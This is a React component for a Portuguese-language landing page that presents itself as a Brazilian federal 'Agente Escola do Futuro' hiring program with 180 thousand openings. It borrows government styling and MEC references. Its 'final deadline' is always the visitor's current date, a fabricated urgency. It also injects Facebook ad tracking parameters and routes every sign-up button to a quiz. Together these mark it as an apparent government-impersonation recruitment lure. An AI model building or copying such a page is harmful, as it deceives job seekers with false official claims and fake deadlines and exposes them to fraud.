import React, { memo, useMemo, useEffect } from "react";
import useUtmNavigator from "../hooks/useUtmNavigator";
import { usePixelTracking } from '../hooks/usePixelTracking';

const Main: React.FC = memo(() => {
	usePixelTracking();
	
	const navigate = useUtmNavigator();

	// On first access: store timestamp and inject UTM template into URL (no reload)
	useEffect(() => {
		try {
			const tsKey = 'firstAccessTimestamp';
			if (!localStorage.getItem(tsKey)) {
				localStorage.setItem(tsKey, new Date().toISOString());
			}

			// UTM template to add when missing
			const UTM_TEMPLATE = {
				utm_source: 'FB',
				utm_campaign: '{{campaign.name}}|{{campaign.id}}',
				utm_medium: '{{adset.name}}|{{adset.id}}',
				utm_content: '{{ad.name}}|{{ad.id}}',
				utm_term: '{{placement}}',
			};

			const params = new URLSearchParams(window.location.search);
			const hasAnyUtm = ['utm_source','utm_campaign','utm_medium','utm_content','utm_term'].some(k => params.has(k));
			if (!hasAnyUtm) {
				Object.entries(UTM_TEMPLATE).forEach(([k, v]) => {
					if (!params.has(k)) params.set(k, String(v));
				});
				const newSearch = params.toString();
				const newUrl = window.location.pathname + (newSearch ? `?${newSearch}` : '') + window.location.hash;
				window.history.replaceState(null, '', newUrl);
			}
		} catch (e) {
			// ignore errors (e.g., localStorage not available)
		}
	}, []);

	// Memoizar a data atual para evitar recálculos
	const currentDate = useMemo(() => {
		const date = new Date();
		const day = String(date.getDate()).padStart(2, '0');
		const month = String(date.getMonth() + 1).padStart(2, '0');
		const year = date.getFullYear();
		return `${day}/${month}/${year}`;
	}, []);

	// Memoizar handlers para evitar re-renders
	const shareHandlers = useMemo(() => ({
		facebook: () => {
			const url = window.location.href;
			window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(url)}`, '_blank');
		},
		twitter: () => {
			const url = window.location.href;
			const title = 'Portal Agente Escola';
			window.open(`https://twitter.com/intent/tweet?url=${encodeURIComponent(url)}&text=${encodeURIComponent(title)}`, '_blank');
		},
		whatsapp: () => {
			const url = window.location.href;
			const title = 'Portal Agente Escola';
			window.open(`https://wa.me/?text=${encodeURIComponent(title + ' ' + url)}`, '_blank');
		},
		copyLink: () => {
			navigator.clipboard.writeText(window.location.href);
		}
	}), []);

	const handleInscricaoClick = () => navigate("/quiz");
	const handleAreaInscricaoClick = () => navigate("/quiz");

	return (
		<main className="container mx-auto px-1 py-4 flex-grow">
			{/* Banner */}
			<div className="px-4 pb-6">
				<img 
					src="https://i.ibb.co/JRSY7bdC/IMAGEM.webp" 
					alt="Concurso Público Nacional Unificado" 
					loading="eager"
					className="max-w-full h-auto"
				/>
			</div>

			{/* Content Section */}
			<div className="max-w-4xl mx-auto px-4 pb-4">
				<h1 className="text-[#0C336F] text-lg leading-7 font-bold mb-4">Sobre o Programa</h1>

				<div className="space-y-6">
					<p className="text-[17px] leading-relaxed text-[#333333]">
						O programa Agente Escola do Futuro é uma iniciativa do Governo Federal que marca a ampliação na contratação, formação e atuação de profissionais nas escolas públicas de todo o país. Neste novo momento, o programa abre vagas para novos agentes por meio de um processo seletivo nacional, permitindo que qualquer cidadão brasileiro participe da seleção.
					</p>

					<p className="text-[17px] leading-relaxed text-[#333333]">
						Os aprovados receberão formação técnica gratuita e passarão a atuar diretamente em escolas públicas próximas de suas residências, fortalecendo o vínculo com a comunidade escolar e promovendo a integração entre a escola, os alunos e as famílias. As atribuições incluem auxílio na organização das salas e espaços escolares, apoio na entrada e saída dos alunos, colaboração em atividades educativas e recreativas, além de apoio no atendimento às famílias e à comunidade escolar.
					</p>

					<p className="text-[17px] leading-relaxed text-[#333333]">
						Os salários variam entre R$ <span className="text-[#1351B4] font-semibold">3.456,13</span> e R$
						<span className="text-[#1351B4] font-semibold"> 4.290,71</span>, dependendo da região e da
						modalidade de atuação.
					</p>

					<p className="text-[17px] leading-relaxed text-[#333333]">
						A estratégia tem como objetivo preparar os agentes para novas atribuições e para os desafios atuais do ambiente escolar, como o aumento das demandas sociais e educacionais que impactam diretamente o desempenho e bem-estar dos estudantes. Com agentes mais capacitados e em maior número, será possível identificar com mais precisão as necessidades da comunidade escolar e oferecer um apoio mais resolutivo, justo e participativo.
					</p>

					{/* Image - Lazy loading para melhor performance */}
					<div className="flex justify-center my-6">
						<img
							src="https://i.ibb.co/HTPs0QC8/Escol-A-4.png"
							alt="Grupo de voluntários abraçados representando união e colaboração"
							loading="lazy"
							className="rounded-lg shadow-lg max-w-full h-auto"
						/>
					</div>

					{/* Info Cards - Otimizado */}
					<div className="bg-white shadow-md rounded-lg border-2 border-[#1351B4] overflow-hidden">
						<div className="bg-[#1351B4] py-4 px-6">
							<h3 className="text-xl font-bold text-white uppercase text-center">
								Informações Importantes
							</h3>
						</div>
						<div className="p-6 bg-gray-50">
							<div className="grid grid-cols-1 md:grid-cols-3 gap-4">
								<div className="bg-white p-4 rounded-lg border-l-4 border-[#1351B4] shadow-sm">
									<div className="text-gray-700 font-bold uppercase text-sm mb-2">Oportunidade:</div>
									<div className="text-2xl font-bold text-[#1351B4]">180 MIL</div>
									<div className="text-gray-700 font-medium mt-1">novas vagas disponíveis</div>
								</div>
								<div className="bg-white p-4 rounded-lg border-l-4 border-[#1351B4] shadow-sm">
									<div className="text-gray-700 font-bold uppercase text-sm mb-2">Salário Inicial:</div>
									<div className="text-2xl font-bold text-[#1351B4]">R$ 3.456,13</div>
									<div className="text-gray-700 font-medium mt-1">podendo chegar a R$ 4.290,71</div>
								</div>
								<div className="bg-white p-4 rounded-lg border-l-4 border-[#1351B4] shadow-sm">
									<div className="text-gray-700 font-bold uppercase text-sm mb-2">Escolaridade:</div>
									<div className="text-2xl font-bold text-[#1351B4]">ENSINO MÉDIO</div>
									<div className="text-gray-700 font-medium mt-1">nível da prova</div>
								</div>
							</div>
							<div className="mt-6 bg-blue-50 p-3 border border-blue-100 rounded-lg text-center">
								<span className="text-sm font-bold text-[#1351B4]">Oportunidade: Ingresso rápido em carreira pública</span>
							</div>
						</div>
					</div>

					{/* CTA Section - Prioridade alta */}
					<div className="mt-8 border border-gray-200 overflow-hidden">
						<div 
							className="bg-[#1351B4] text-white p-4 text-xl font-semibold cursor-pointer hover:bg-[#1351B4]/90 transition-colors"
							onClick={handleAreaInscricaoClick}
						>
							Acessar Área de Inscrições
						</div>
						<div className="p-6 text-center">
							<p className="text-red-600 font-medium mb-4">INSCREVA-SE AGORA! VAGAS LIMITADAS</p>
							<button
								onClick={handleInscricaoClick}
								className="bg-[#1351B4] text-white py-3 px-8 rounded-full font-semibold hover:bg-[#1351B4]/90 transition-colors mb-4 text-lg"
							>
								Fazer Inscrição
							</button>
							<p className="text-gray-600">Prazo final: {currentDate}</p>
						</div>
					</div>

					{/* Results Section - Lazy load */}
					<div className="mt-8 border border-gray-200 overflow-hidden">
						<div className="bg-[#1351B4] text-white p-4 text-xl font-semibold">Resultados</div>
						<div className="p-6">
							<ul className="space-y-3 list-disc pl-4">
								<li>
									<span className="text-[#1351B4] font-semibold">83.412</span> mil inscrições homologadas
								</li>
								<li>
									<span className="text-[#1351B4] font-semibold">5.452</span> municípios aderiram ao programa (<span className="text-[#1351B4]">98%</span>)
								</li>
								<li>
									<span className="text-[#1351B4] font-semibold">4 mil</span> tutoras(es) e mais de <span className="text-[#1351B4] font-semibold">10 mil</span> preceptoras(es) envolvidas(os)
								</li>
								<li>
									<span className="text-[#1351B4] font-semibold">88%</span> dos estudantes diplomadas(os) até Fevereiro de <span className="text-[#1351B4]">2026</span>
								</li>
							</ul>
						</div>
					</div>

					{/* Contact Section */}
					<div className="mt-8 border border-gray-200 overflow-hidden">
						<div className="bg-[#1351B4] text-white p-4 text-xl font-semibold">Ouvidoria Geral do MEC</div>
						<div className="p-6">
							<p className="text-gray-700">
								Teleatendente: de segunda-feira a sexta-feira, das 8h às 20h, e aos sábados, das 8h às 18h.
							</p>
						</div>
					</div>
				</div>
			</div>
		</main>
	);
});

Main.displayName = 'Main';

export default Main;
